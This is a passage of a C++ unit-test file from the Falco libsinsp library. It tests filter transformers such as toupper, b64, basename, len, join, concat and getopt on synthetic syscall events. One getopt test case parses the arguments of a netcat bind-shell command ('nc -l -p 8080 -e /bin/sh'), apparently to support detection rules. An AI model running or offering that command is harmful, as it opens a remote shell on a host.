// SPDX-License-Identifier: Apache-2.0
/*
Copyright (C) 2024 The Falco Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

*/

#include <gtest/gtest.h>

#include <set>
#include <libsinsp/utils.h>
#include <libsinsp/sinsp_filter_transformers.h>
#include <libsinsp/sinsp_filtercheck_multivalue_transformer.h>
#include <libsinsp/sinsp_filtercheck_rawstring.h>
#include <sinsp_with_test_input.h>

static std::set<ppm_param_type> all_param_types() {
	std::set<ppm_param_type> ret;
	for(auto i = PT_NONE; i < PT_MAX; i = (ppm_param_type)((size_t)i + 1)) {
		ret.insert(i);
	}
	return ret;
}

template<class T>
static T extract_value_to_scalar(const extract_value_t& val) {
	T ret;
	EXPECT_EQ(val.len, sizeof(T));
	memcpy(&ret, val.ptr, val.len);
	return ret;
}

static std::string supported_type_msg(ppm_param_type t, bool flags, bool support_expected) {
	return std::string("expected ") + (flags ? "list " : "") + "param type to" +
	       std::string((support_expected ? " " : " not ")) +
	       "be supported: " + std::string(param_type_to_string(t));
}

static std::string eq_test_msg(extract_value_t actual, extract_value_t expected) {
	return "expected '" + std::string(reinterpret_cast<const char*>(actual.ptr)) +
	       "' (length: " + std::to_string(actual.len) + ")" + " to be equal to '" +
	       std::string(reinterpret_cast<const char*>(expected.ptr)) +
	       "' (length: " + std::to_string(expected.len) + ")";
}

struct ex_value : public extract_value_t {
	ex_value(const ex_value& val) {
		m_storage = val.m_storage;
		len = val.len;

		ptr = (uint8_t*)m_storage.data();
	}

	ex_value(std::string val) {
		m_storage = std::vector<uint8_t>(val.c_str(), val.c_str() + val.size() + 1);

		len = m_storage.size();
		ptr = (uint8_t*)m_storage.data();
	}

	ex_value(uint64_t val) {
		uint8_t* bytes = reinterpret_cast<uint8_t*>(&val);
		m_storage = std::vector<uint8_t>(bytes, bytes + sizeof(uint64_t));

		len = sizeof(val);
		ptr = (uint8_t*)m_storage.data();
	}

	std::vector<uint8_t> m_storage;
};

struct test_case_entry {
	uint32_t flags;
	ppm_param_type input_type;
	std::vector<ex_value> input;
	ppm_param_type expected_type;
	std::vector<ex_value> expected;
};

static void check_unsupported_types(const std::unique_ptr<sinsp_filter_transformer>& tr,
                                    std::set<ppm_param_type>& supported_types,
                                    std::set<ppm_param_type>& supported_list_types) {
	auto all_types = all_param_types();

	for(auto t : all_types) {
		uint32_t flags = EPF_IS_LIST;
		if(supported_list_types.find(t) == supported_list_types.end()) {
			EXPECT_FALSE(tr->transform_type(t, flags)) << supported_type_msg(t, flags, false);
			// vals is empty for simplicity, should not affect the test
			std::vector<extract_value_t> vals{};
			EXPECT_ANY_THROW(tr->transform_values(vals, t, flags))
			        << supported_type_msg(t, flags, false);
		}

		flags = 0;
		if(supported_types.find(t) == supported_types.end()) {
			EXPECT_FALSE(tr->transform_type(t, flags)) << supported_type_msg(t, flags, false);
			std::vector<extract_value_t> vals{};
			EXPECT_ANY_THROW(tr->transform_values(vals, t, flags))
			        << supported_type_msg(t, flags, false);
		}
	}
}

TEST(sinsp_filter_transformer, toupper) {
	auto tr = sinsp_filter_transformer_factory::create_transformer(
	        filter_transformer_type::FTR_TOUPPER);

	std::set<ppm_param_type> supported_types{PT_CHARBUF, PT_FSPATH, PT_FSRELPATH};
	std::set<ppm_param_type> supported_list_types = supported_types;

	check_unsupported_types(tr, supported_types, supported_list_types);

	std::vector<test_case_entry> test_cases{
	        {0, PT_CHARBUF, {{"hello"}}, PT_CHARBUF, {{"HELLO"}}},
	        {0, PT_CHARBUF, {{"WORLD"}}, PT_CHARBUF, {{"WORLD"}}},
	        {0, PT_CHARBUF, {{"eXcItED"}}, PT_CHARBUF, {{"EXCITED"}}},
	        {0, PT_CHARBUF, {{""}}, PT_CHARBUF, {{""}}},
	        {0,
	         PT_CHARBUF,
	         {{"hello"}, {"wOrLd"}, {"ONE_1234"}},
	         PT_CHARBUF,
	         {{"HELLO"}, {"WORLD"}, {"ONE_1234"}}},
	};

	for(auto const& tc : test_cases) {
		auto transformed_type = tc.input_type;
		uint32_t flags = tc.flags;
		bool is_list = flags & EPF_IS_LIST;
		EXPECT_TRUE(tr->transform_type(transformed_type, flags))
		        << supported_type_msg(tc.input_type, is_list, true);
		EXPECT_EQ(transformed_type, tc.expected_type);

		std::vector<extract_value_t> vals{};
		for(auto const& val : tc.input) {
			vals.push_back(val);
		}

		transformed_type = tc.input_type;
		EXPECT_TRUE(tr->transform_values(vals, transformed_type, flags))
		        << supported_type_msg(tc.input_type, is_list, true);
		EXPECT_EQ(vals.size(), tc.expected.size());

		for(std::vector<extract_value_t>::size_type i = 0; i < vals.size(); i++) {
			std::string actual = (const char*)vals[i].ptr;
			std::string expected = (const char*)tc.expected[i].ptr;
			EXPECT_EQ(actual, expected) << eq_test_msg(vals[i], tc.expected[i]);
			EXPECT_EQ(vals[i].len, tc.expected[i].len) << eq_test_msg(vals[i], tc.expected[i]);
		}
	}
}

TEST(sinsp_filter_transformer, tolower) {
	auto tr = sinsp_filter_transformer_factory::create_transformer(
	        filter_transformer_type::FTR_TOLOWER);

	std::set<ppm_param_type> supported_types{PT_CHARBUF, PT_FSPATH, PT_FSRELPATH};
	std::set<ppm_param_type> supported_list_types = supported_types;

	check_unsupported_types(tr, supported_types, supported_list_types);

	std::vector<test_case_entry> test_cases{
	        {0, PT_CHARBUF, {{"HELLO"}}, PT_CHARBUF, {{"hello"}}},
	        {0, PT_CHARBUF, {{"world"}}, PT_CHARBUF, {{"world"}}},
	        {0, PT_CHARBUF, {{"NoT eXcItED"}}, PT_CHARBUF, {{"not excited"}}},
	        {0, PT_CHARBUF, {{""}}, PT_CHARBUF, {{""}}},
	        {EPF_IS_LIST,
	         PT_CHARBUF,
	         {{"HELLO"}, {"wOrLd"}, {"one_1234"}},
	         PT_CHARBUF,
	         {{"hello"}, {"world"}, {"one_1234"}}},
	};

	for(auto const& tc : test_cases) {
		bool is_list = tc.flags & EPF_IS_LIST;
		uint32_t flags = tc.flags;
		auto transformed_type = tc.input_type;

		EXPECT_TRUE(tr->transform_type(transformed_type, flags))
		        << supported_type_msg(tc.input_type, is_list, true);
		EXPECT_EQ(transformed_type, tc.expected_type);

		std::vector<extract_value_t> vals{};
		for(auto const& val : tc.input) {
			vals.push_back(val);
		}

		transformed_type = tc.input_type;
		EXPECT_TRUE(tr->transform_values(vals, transformed_type, flags))
		        << supported_type_msg(tc.input_type, is_list, true);
		EXPECT_EQ(vals.size(), tc.expected.size());

		for(std::vector<extract_value_t>::size_type i = 0; i < vals.size(); i++) {
			std::string actual = (const char*)vals[i].ptr;
			std::string expected = (const char*)tc.expected[i].ptr;
			EXPECT_EQ(actual, expected) << eq_test_msg(vals[i], tc.expected[i]);
			EXPECT_EQ(vals[i].len, tc.expected[i].len) << eq_test_msg(vals[i], tc.expected[i]);
		}
	}
}

TEST(sinsp_filter_transformer, b64) {
	auto tr = sinsp_filter_transformer_factory::create_transformer(
	        filter_transformer_type::FTR_BASE64);

	std::set<ppm_param_type> supported_types{PT_CHARBUF, PT_FSPATH, PT_FSRELPATH, PT_BYTEBUF};
	std::set<ppm_param_type> supported_list_types = supported_types;

	check_unsupported_types(tr, supported_types, supported_list_types);

	std::vector<test_case_entry> test_cases{
	        {0, PT_CHARBUF, {{"aGVsbG8="}}, PT_CHARBUF, {{"hello"}}},
	        {0, PT_CHARBUF, {{"d29ybGQgIQ=="}}, PT_CHARBUF, {{"world !"}}},
	        {0, PT_CHARBUF, {{""}}, PT_CHARBUF, {{""}}},
	};

	for(auto const& tc : test_cases) {
		bool is_list = tc.flags & EPF_IS_LIST;
		uint32_t flags = tc.flags;
		auto transformed_type = tc.input_type;

		EXPECT_TRUE(tr->transform_type(transformed_type, flags))
		        << supported_type_msg(tc.input_type, is_list, true);
		EXPECT_EQ(transformed_type, tc.expected_type);

		std::vector<extract_value_t> vals{};
		for(auto const& val : tc.input) {
			vals.push_back(val);
		}

		transformed_type = tc.input_type;
		EXPECT_TRUE(tr->transform_values(vals, transformed_type, flags))
		        << supported_type_msg(tc.input_type, is_list, true);
		EXPECT_EQ(vals.size(), tc.expected.size());

		for(std::vector<extract_value_t>::size_type i = 0; i < vals.size(); i++) {
			std::string actual = (const char*)vals[i].ptr;
			std::string expected = (const char*)tc.expected[i].ptr;
			EXPECT_EQ(actual, expected) << eq_test_msg(vals[i], tc.expected[i]);
			EXPECT_EQ(vals[i].len, tc.expected[i].len) << eq_test_msg(vals[i], tc.expected[i]);
		}
	}
}

TEST(sinsp_filter_transformer, basename) {
	auto tr = sinsp_filter_transformer_factory::create_transformer(
	        filter_transformer_type::FTR_BASENAME);

	std::set<ppm_param_type> supported_types{PT_CHARBUF, PT_FSPATH, PT_FSRELPATH};
	std::set<ppm_param_type> supported_list_types = supported_types;

	check_unsupported_types(tr, supported_types, supported_list_types);

	std::vector<test_case_entry> test_cases{
	        {0, PT_CHARBUF, {{"/home/ubuntu/hello.txt"}}, PT_CHARBUF, {{"hello.txt"}}},
	        {0, PT_FSPATH, {{"/usr/local/bin/cat"}}, PT_FSPATH, {{"cat"}}},
	        {0, PT_FSPATH, {{"/"}}, PT_FSPATH, {{""}}},
	        {0, PT_CHARBUF, {{"/hello/"}}, PT_CHARBUF, {{""}}},
	        {0, PT_CHARBUF, {{"hello"}}, PT_CHARBUF, {{"hello"}}},
	        {0, PT_CHARBUF, {{""}}, PT_CHARBUF, {{""}}},
	};

	for(auto const& tc : test_cases) {
		bool is_list = tc.flags & EPF_IS_LIST;
		uint32_t flags = tc.flags;
		auto transformed_type = tc.input_type;

		EXPECT_TRUE(tr->transform_type(transformed_type, flags))
		        << supported_type_msg(tc.input_type, is_list, true);
		EXPECT_EQ(transformed_type, tc.expected_type);

		std::vector<extract_value_t> vals{};
		for(auto const& val : tc.input) {
			vals.push_back(val);
		}

		transformed_type = tc.input_type;
		EXPECT_TRUE(tr->transform_values(vals, transformed_type, flags))
		        << supported_type_msg(tc.input_type, is_list, true);
		EXPECT_EQ(vals.size(), tc.expected.size());

		for(std::vector<extract_value_t>::size_type i = 0; i < vals.size(); i++) {
			std::string actual = (const char*)vals[i].ptr;
			std::string expected = (const char*)tc.expected[i].ptr;
			EXPECT_EQ(actual, expected) << eq_test_msg(vals[i], tc.expected[i]);
			EXPECT_EQ(vals[i].len, tc.expected[i].len) << eq_test_msg(vals[i], tc.expected[i]);
		}
	}
}

TEST(sinsp_filter_transformer, len) {
	auto tr =
	        sinsp_filter_transformer_factory::create_transformer(filter_transformer_type::FTR_LEN);

	std::set<ppm_param_type> supported_types{PT_CHARBUF, PT_FSPATH, PT_FSRELPATH, PT_BYTEBUF};
	std::set<ppm_param_type> supported_list_types = all_param_types();

	check_unsupported_types(tr, supported_types, supported_list_types);

	std::vector<test_case_entry> test_cases{
	        {0, PT_CHARBUF, {{"/home/ubuntu/hello.txt"}}, PT_UINT64, {{22}}},
	        {0, PT_FSPATH, {{"/"}}, PT_UINT64, {{1}}},
	        {EPF_IS_LIST, PT_FSPATH, {{"/hello"}}, PT_UINT64, {{1}}},
	        {EPF_IS_LIST, PT_CHARBUF, {}, PT_UINT64, {{0}}},
	        {EPF_IS_LIST, PT_UINT64, {{1}, {2}, {3}, {4}, {5}}, PT_UINT64, {{5}}},
	};

	for(auto const& tc : test_cases) {
		bool is_list = tc.flags & EPF_IS_LIST;
		uint32_t flags = tc.flags;
		auto transformed_type = tc.input_type;

		EXPECT_TRUE(tr->transform_type(transformed_type, flags))
		        << supported_type_msg(tc.input_type, is_list, true);
		EXPECT_EQ(transformed_type, tc.expected_type);

		std::vector<extract_value_t> vals{};
		for(auto const& val : tc.input) {
			vals.push_back(val);
		}

		transformed_type = tc.input_type;
		flags = tc.flags;
		EXPECT_TRUE(tr->transform_values(vals, transformed_type, flags))
		        << supported_type_msg(tc.input_type, is_list, true);
		EXPECT_EQ(vals.size(), tc.expected.size());

		for(std::vector<extract_value_t>::size_type i = 0; i < vals.size(); i++) {
			uint64_t actual = extract_value_to_scalar<uint64_t>(vals[i]);
			uint64_t expected = extract_value_to_scalar<uint64_t>(tc.expected[i]);
			EXPECT_EQ(actual, expected);
		}
	}
}

TEST_F(sinsp_with_test_input, basename_transformer) {
	add_default_init_thread();
	open_inspector();

	int64_t dirfd = 3;
	auto* file_to_run = "/tmp/file_to_run";
	const auto evt = add_event_advance_ts(increasing_ts(),
	                                      1,
	                                      PPME_SYSCALL_OPEN_X,
	                                      6,
	                                      dirfd,
	                                      file_to_run,
	                                      (uint32_t)0,
	                                      (uint32_t)0,
	                                      (uint32_t)0,
	                                      (uint64_t)0);

	EXPECT_TRUE(eval_filter(evt, "basename(fd.name) = file_to_run"));
	EXPECT_FALSE(eval_filter(evt, "basename(fd.name) = /tmp/file_to_run"));
}

TEST_F(sinsp_with_test_input, len_transformer) {
	add_default_init_thread();
	open_inspector();

	sinsp_evt* evt;

	int64_t dirfd = 3;
	const char* file_to_run = "/tmp/file_to_run";

	evt = add_event_advance_ts(increasing_ts(),
	                           1,
	                           PPME_SYSCALL_OPEN_X,
	                           6,
	                           dirfd,
	                           file_to_run,
	                           0,
	                           0,
	                           0,
	                           (uint64_t)0);

	// fd.types = (file)
	EXPECT_TRUE(eval_filter(evt, "len(fd.types) = 1"));
	EXPECT_TRUE(eval_filter(evt, "len(fd.types) > 0"));
	EXPECT_FALSE(eval_filter(evt, "len(fd.types) = 0"));

	EXPECT_TRUE(eval_filter(evt, "len(fd.name) = 16"));

	evt = generate_socket_exit_event();
	// fd.types = (ipv4,file)
	EXPECT_TRUE(eval_filter(evt, "len(fd.types) = 2"));

	uint8_t read_buf[] = {'\x01', '\x02', '\x03', '\x04', '\x05', '\x06'};
	evt = add_event_advance_ts(increasing_ts(),
	                           1,
	                           PPME_SYSCALL_READ_X,
	                           4,
	                           (int64_t)0,
	                           scap_const_sized_buffer{read_buf, sizeof(read_buf)},
	                           (int64_t)0,
	                           (uint32_t)0);

	EXPECT_TRUE(eval_filter(evt, "len(evt.arg.data) == 6"));
}

TEST_F(sinsp_with_test_input, multivalue_transformer_join) {
	add_default_init_thread();
	open_inspector();

	sinsp_evt* evt;

	int64_t dirfd = 3;
	const char* file_to_run = "/tmp/file_to_run";

	evt = add_event_advance_ts(increasing_ts(),
	                           1,
	                           PPME_SYSCALL_OPEN_X,
	                           6,
	                           dirfd,
	                           file_to_run,
	                           0,
	                           0,
	                           0,
	                           (uint64_t)0);

	EXPECT_TRUE(eval_filter(
	        evt,
	        "join(fd.name, (fd.name,fd.directory)) = /tmp/file_to_run/tmp/file_to_run/tmp"));
	EXPECT_TRUE(eval_filter(evt, "join(\"-\", (fd.name,fd.directory)) = /tmp/file_to_run-/tmp"));
	EXPECT_TRUE(eval_filter(evt, "join(\"-\", (\"aaa\",\"bbb\")) = aaa-bbb"));
	EXPECT_TRUE(eval_filter(evt, "join(\"->\", (\"aaa\",\"bbb\")) = aaa->bbb"));
	EXPECT_TRUE(eval_filter(evt, "join(\"->\", (\"aaa\")) = aaa"));
	EXPECT_TRUE(eval_filter(evt, "join(\"->\", (fd.name, \"aaa\")) = /tmp/file_to_run->aaa"));
	EXPECT_TRUE(eval_filter(
	        evt,
	        "join(\"->\", (fd.name, \"aaa\", fd.directory)) = /tmp/file_to_run->aaa->/tmp"));
	EXPECT_TRUE(
	        eval_filter(evt, "join(\"->\", (toupper(fd.name), \"aaa\")) = /TMP/FILE_TO_RUN->aaa"));
	EXPECT_TRUE(
	        eval_filter(evt, "join(\"->\", ( \"aaa\", toupper(fd.name))) = aaa->/TMP/FILE_TO_RUN"));
	EXPECT_TRUE(eval_filter(evt,
	                        "join(\"-\", (fd.directory, join(\"->\", ( \"aaa\", "
	                        "toupper(fd.name))))) = /tmp-aaa->/TMP/FILE_TO_RUN"));
	EXPECT_TRUE(eval_filter(evt, "join(\",\", (\"aaa\",\"bbb\")) = \"aaa,bbb\""));
	EXPECT_FALSE(eval_filter(evt, "join(\",\", (\"aaa\",\"bbb\")) = \"aaa-bbb\""));
	EXPECT_TRUE(eval_filter(evt, "join(\",\", (evt.num, evt.num)) = \"1,1\""));
	EXPECT_TRUE(eval_filter(evt, "join(\",\", ()) = \"\""));
	EXPECT_FALSE(eval_filter(evt, "join(\",\", ()) = \",\""));

	// Validation error tests
	// join() requires exactly 2 arguments
	EXPECT_THROW(eval_filter(evt, "join() = foo"), sinsp_exception);
	EXPECT_THROW(eval_filter(evt, "join(\"-\") = foo"), sinsp_exception);
	EXPECT_THROW(eval_filter(evt, "join(\"-\", \"a\", \"b\") = foo"), sinsp_exception);
	// join() first argument (separator) must not be a list
	EXPECT_THROW(eval_filter(evt, "join(fd.types, (\"a\", \"b\")) = foo"), sinsp_exception);
	EXPECT_THROW(eval_filter(evt, "join((\"a\", \"b\"), (\"a\", \"b\")) = foo"), sinsp_exception);
	EXPECT_THROW(eval_filter(evt, "join((\"a\", \"b\"), \"a\") = foo"), sinsp_exception);
	EXPECT_THROW(eval_filter(evt, "join(\"a\", \"b\") = foo"), sinsp_exception);
}

TEST_F(sinsp_with_test_input, multivalue_transformer_concat) {
	add_default_init_thread();
	open_inspector();

	sinsp_evt* evt;

	int64_t dirfd = 3;
	const char* file_to_run = "/tmp/file_to_run";

	evt = add_event_advance_ts(increasing_ts(),
	                           1,
	                           PPME_SYSCALL_OPEN_X,
	                           6,
	                           dirfd,
	                           file_to_run,
	                           0,
	                           0,
	                           0,
	                           (uint64_t)0);

	EXPECT_TRUE(eval_filter(evt, "concat(fd.name, fd.directory) = /tmp/file_to_run/tmp"));
	EXPECT_TRUE(eval_filter(evt, "concat(\"aaa\", \"bbb\") = aaabbb"));
	EXPECT_TRUE(eval_filter(evt, "concat(\"aaa\", \"bbb\", \"ccc\") = aaabbbccc"));
	EXPECT_TRUE(eval_filter(evt, "concat(fd.name, \"aaa\") = /tmp/file_to_runaaa"));
	EXPECT_TRUE(
	        eval_filter(evt, "concat(fd.name, \"aaa\", fd.directory) = /tmp/file_to_runaaa/tmp"));
	EXPECT_TRUE(eval_filter(evt, "concat(toupper(fd.name), \"aaa\") = /TMP/FILE_TO_RUNaaa"));
	EXPECT_TRUE(eval_filter(evt, "concat(\"aaa\", toupper(fd.name)) = aaa/TMP/FILE_TO_RUN"));
	EXPECT_TRUE(eval_filter(
	        evt,
	        "concat(fd.directory, concat(\"aaa\", toupper(fd.name))) = /tmpaaa/TMP/FILE_TO_RUN"));
	EXPECT_TRUE(eval_filter(evt, "concat(\"aaa\", \"bbb\") = \"aaabbb\""));
	EXPECT_FALSE(eval_filter(evt, "concat(\"aaa\", \"bbb\") = \"aaa-bbb\""));

	// Validation error tests
	// concat() requires at least 2 arguments
	EXPECT_THROW(eval_filter(evt, "concat() = foo"), sinsp_exception);
	EXPECT_THROW(eval_filter(evt, "concat(\"aaa\") = foo"), sinsp_exception);
	// concat() arguments must be strings (not lists)
	EXPECT_THROW(eval_filter(evt, "concat(fd.types, \"a\") = foo"), sinsp_exception);
	EXPECT_THROW(eval_filter(evt, "concat((\"a\", \"b\"), \"a\") = foo"), sinsp_exception);
	EXPECT_THROW(eval_filter(evt, "concat(\"a\", (\"a\", \"b\")) = foo"), sinsp_exception);
	EXPECT_THROW(eval_filter(evt, "concat((\"a\", \"b\"), (\"a\", \"b\")) = foo"), sinsp_exception);
}

TEST_F(sinsp_with_test_input, multivalue_transformer_with_outer_transformer) {
	add_default_init_thread();
	open_inspector();

	sinsp_evt* evt;

	int64_t dirfd = 3;
	const char* file_to_run = "/tmp/file_to_run";

	evt = add_event_advance_ts(increasing_ts(),
	                           1,
	                           PPME_SYSCALL_OPEN_X,
	                           6,
	                           dirfd,
	                           file_to_run,
	                           0,
	                           0,
	                           0,
	                           (uint64_t)0);

	// Apply toupper to join result
	EXPECT_TRUE(
	        eval_filter(evt,
	                    "toupper(join(\"-\", (fd.name, fd.directory))) = /TMP/FILE_TO_RUN-/TMP"));
	EXPECT_TRUE(eval_filter(evt, "toupper(join(\"-\", (\"aaa\", \"bbb\"))) = AAA-BBB"));

	// Apply tolower to join result
	EXPECT_TRUE(
	        eval_filter(evt,
	                    "tolower(join(\"-\", (fd.name, fd.directory))) = /tmp/file_to_run-/tmp"));
	EXPECT_TRUE(eval_filter(evt, "tolower(join(\"-\", (\"AAA\", \"BBB\"))) = aaa-bbb"));

	// Apply len to join result
	// fd.name = /tmp/file_to_run (16 chars), fd.directory = /tmp (4 chars), separator = - (1 char)
	// Total = 16 + 1 + 4 = 21
	EXPECT_TRUE(eval_filter(evt, "len(join(\"-\", (fd.name, fd.directory))) = 21"));
	EXPECT_TRUE(eval_filter(evt, "len(join(\"-\", (\"aaa\", \"bbb\"))) = 7"));

	// Apply b64 to join result
	// "aaa-bbb" in base64 is "YWFhLWJiYg=="
	EXPECT_TRUE(eval_filter(evt, "join(\"-\", (\"aaa\", \"bbb\")) = \"aaa-bbb\""));
	EXPECT_TRUE(eval_filter(evt, "b64(join(\"W\", (\"YWFhL\", \"JiYg\"))) = \"aaa-bbb\""));

	// Chain multiple transformers on join result
	EXPECT_TRUE(eval_filter(
	        evt,
	        "toupper(tolower(join(\"-\", (fd.name, fd.directory)))) = /TMP/FILE_TO_RUN-/TMP"));

	//// Combine with comparison operators
	EXPECT_TRUE(eval_filter(evt, "toupper(join(\"-\", (fd.name, fd.directory))) contains /TMP"));
	EXPECT_TRUE(eval_filter(evt, "toupper(join(\"-\", (fd.name, fd.directory))) startswith /TMP"));
	EXPECT_TRUE(eval_filter(evt, "len(join(\"-\", (fd.name, fd.directory))) > 20"));
	EXPECT_TRUE(eval_filter(evt, "len(join(\"-\", (fd.name, fd.directory))) >= 21"));
	EXPECT_TRUE(eval_filter(evt, "len(join(\"-\", (fd.name, fd.directory))) < 22"));

	// Apply toupper to concat result
	EXPECT_TRUE(eval_filter(evt, "toupper(concat(fd.name, fd.directory)) = /TMP/FILE_TO_RUN/TMP"));
	EXPECT_TRUE(eval_filter(evt, "toupper(concat(\"aaa\", \"bbb\")) = AAABBB"));

	// Apply tolower to concat result
	EXPECT_TRUE(eval_filter(evt, "tolower(concat(fd.name, fd.directory)) = /tmp/file_to_run/tmp"));
	EXPECT_TRUE(eval_filter(evt, "tolower(concat(\"AAA\", \"BBB\")) = aaabbb"));

	// Apply len to concat result
	// fd.name = /tmp/file_to_run (16 chars), fd.directory = /tmp (4 chars)
	// Total = 16 + 4 = 20
	EXPECT_TRUE(eval_filter(evt, "len(concat(fd.name, fd.directory)) = 20"));
	EXPECT_TRUE(eval_filter(evt, "len(concat(\"aaa\", \"bbb\")) = 6"));

	// Apply b64 to concat result
	// "aaabbb" in base64 is "YWFhYmJi"
	EXPECT_TRUE(eval_filter(evt, "concat(\"aaa\", \"bbb\") = \"aaabbb\""));
	EXPECT_TRUE(eval_filter(evt, "b64(concat(\"YWFh\", \"YmJi\")) = \"aaabbb\""));

	// Chain multiple transformers on concat result
	EXPECT_TRUE(
	        eval_filter(evt,
	                    "toupper(tolower(concat(fd.name, fd.directory))) = /TMP/FILE_TO_RUN/TMP"));

	// Combine with comparison operators
	EXPECT_TRUE(eval_filter(evt, "toupper(concat(fd.name, fd.directory)) contains /TMP"));
	EXPECT_TRUE(eval_filter(evt, "toupper(concat(fd.name, fd.directory)) startswith /TMP"));
	EXPECT_TRUE(eval_filter(evt, "len(concat(fd.name, fd.directory)) > 19"));
	EXPECT_TRUE(eval_filter(evt, "len(concat(fd.name, fd.directory)) >= 20"));
	EXPECT_TRUE(eval_filter(evt, "len(concat(fd.name, fd.directory)) < 21"));
}

TEST(multivalue_transformer, argument_types) {
	// Create arguments for join: separator (string) and list
	std::vector<std::unique_ptr<sinsp_filter_check>> args;

	// First argument: a single string (separator)
	args.push_back(std::make_unique<rawstring_check>("-"));

	// Second argument: a list of strings
	std::vector<std::string> list_values = {"a", "b", "c"};
	args.push_back(std::make_unique<list_check>(list_values));

	// Create the join transformer
	sinsp_filter_multivalue_transformer_join join_transformer(std::move(args));

	// Test argument_types()
	const auto& arg_types = join_transformer.argument_types();

	ASSERT_EQ(arg_types.size(), 2);

	// First argument should be PT_CHARBUF and not a list
	EXPECT_EQ(arg_types[0].type, PT_CHARBUF);
	EXPECT_FALSE(arg_types[0].is_list);

	// Second argument should be PT_CHARBUF and a list
	EXPECT_EQ(arg_types[1].type, PT_CHARBUF);
	EXPECT_TRUE(arg_types[1].is_list);
}

TEST(multivalue_transformer, argument_types_with_mixed_types) {
	// Test with numeric values in the list
	std::vector<std::unique_ptr<sinsp_filter_check>> args;

	// Separator
	args.push_back(std::make_unique<rawstring_check>(","));

	// List with mixed elements (still strings at the filtercheck level)
	std::vector<std::string> list_values = {"1", "2", "3"};
	args.push_back(std::make_unique<list_check>(list_values));

	sinsp_filter_multivalue_transformer_join join_transformer(std::move(args));

	const auto& arg_types = join_transformer.argument_types();

	ASSERT_EQ(arg_types.size(), 2);
	EXPECT_EQ(arg_types[0].type, PT_CHARBUF);
	EXPECT_FALSE(arg_types[0].is_list);
	EXPECT_EQ(arg_types[1].type, PT_CHARBUF);
	EXPECT_TRUE(arg_types[1].is_list);
}

TEST(multivalue_transformer, result_type) {
	std::vector<std::unique_ptr<sinsp_filter_check>> args;
	args.push_back(std::make_unique<rawstring_check>("-"));
	std::vector<std::string> list_values = {"a", "b"};
	args.push_back(std::make_unique<list_check>(list_values));

	sinsp_filter_multivalue_transformer_join join_transformer(std::move(args));

	// join should return PT_CHARBUF and not a list
	auto result = join_transformer.result_type();
	EXPECT_EQ(result.type, PT_CHARBUF);
	EXPECT_FALSE(result.is_list);
}

TEST(multivalue_transformer_concat, argument_types) {
	// Create arguments for concat: multiple strings
	std::vector<std::unique_ptr<sinsp_filter_check>> args;

	// First argument: a string
	args.push_back(std::make_unique<rawstring_check>("aaa"));

	// Second argument: another string
	args.push_back(std::make_unique<rawstring_check>("bbb"));

	// Third argument: another string
	args.push_back(std::make_unique<rawstring_check>("ccc"));

	// Create the concat transformer
	sinsp_filter_multivalue_transformer_concat concat_transformer(std::move(args));

	// Test argument_types()
	const auto& arg_types = concat_transformer.argument_types();

	ASSERT_EQ(arg_types.size(), 3);

	// All arguments should be PT_CHARBUF and not lists
	for(size_t i = 0; i < arg_types.size(); i++) {
		EXPECT_EQ(arg_types[i].type, PT_CHARBUF);
		EXPECT_FALSE(arg_types[i].is_list);
	}
}

TEST(multivalue_transformer_concat, result_type) {
	std::vector<std::unique_ptr<sinsp_filter_check>> args;
	args.push_back(std::make_unique<rawstring_check>("aaa"));
	args.push_back(std::make_unique<rawstring_check>("bbb"));

	sinsp_filter_multivalue_transformer_concat concat_transformer(std::move(args));

	// concat should return PT_CHARBUF and not a list
	auto result = concat_transformer.result_type();
	EXPECT_EQ(result.type, PT_CHARBUF);
	EXPECT_FALSE(result.is_list);
}

TEST_F(sinsp_with_test_input, multivalue_transformer_getopt) {
	add_default_init_thread();
	open_inspector();

	sinsp_evt* evt;

	// Use a simple event - we're testing the transformer logic, not event extraction
	int64_t dirfd = 3;
	const char* file_to_run = "/tmp/file_to_run";

	evt = add_event_advance_ts(increasing_ts(),
	                           1,
	                           PPME_SYSCALL_OPEN_X,
	                           6,
	                           dirfd,
	                           file_to_run,
	                           0,
	                           0,
	                           0,
	                           (uint64_t)0);

	// Test basic option without argument: -n
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-n",""), "n") intersects ("n"))"));

	// Test option with argument: -t hello
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-t", "hello"), "t:") intersects ("t", "hello"))"));

	// Test grouped options: -nt hello
	EXPECT_TRUE(
	        eval_filter(evt, R"(getopt(("-nt", "hello"), "nt:") intersects ("n", "t", "hello"))"));

	// Test option with immediate value: -thello
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-thello"), "t:") intersects ("t", "hello"))"));

	// Test multiple separate options
	EXPECT_TRUE(
	        eval_filter(evt,
	                    R"(getopt(("-n", "-t", "hello"), "nt:") intersects ("n", "t", "hello"))"));

	// Test that option not present doesn't match
	EXPECT_FALSE(eval_filter(evt, R"(getopt(("-n"), "n") intersects ("t"))"));

	// Test -- stops option parsing
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-n", "--", "-t"), "nt:") intersects ("n"))"));
	EXPECT_FALSE(eval_filter(evt, R"(getopt(("-n", "--", "-t"), "nt:") intersects ("t"))"));

	// Test unknown options are skipped
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-x", "-n"), "n") intersects ("n"))"));
	EXPECT_FALSE(eval_filter(evt, R"(getopt(("-x", "-n"), "n") intersects ("x"))"));

	// Test non-option arguments are skipped
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("arg1", "-n", "arg2"), "n") intersects ("n"))"));

	// Test complex real-world example: nc -l -p 8080 -e /bin/sh
	EXPECT_TRUE(eval_filter(
	        evt,
	        R"(getopt(("-l", "-p", "8080", "-e", "/bin/sh"), "lp:e:") intersects ("l", "p", "e", "8080", "/bin/sh"))"));

	// Test grouped options with value: -lpe /bin/sh
	EXPECT_TRUE(
	        eval_filter(evt, R"(getopt(("-lpe", "/bin/sh"), "lp:e:") intersects ("l","p","e"))"));
	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-lpe", "/bin/sh"), "lpe:") intersects ("/bin/sh"))"));

	// Validation error tests
	// getopt() requires exactly 2 arguments
	EXPECT_THROW(eval_filter(evt, R"(getopt() intersects ("n"))"), sinsp_exception);
	EXPECT_THROW(eval_filter(evt, R"(getopt(("a")) intersects ("n"))"), sinsp_exception);
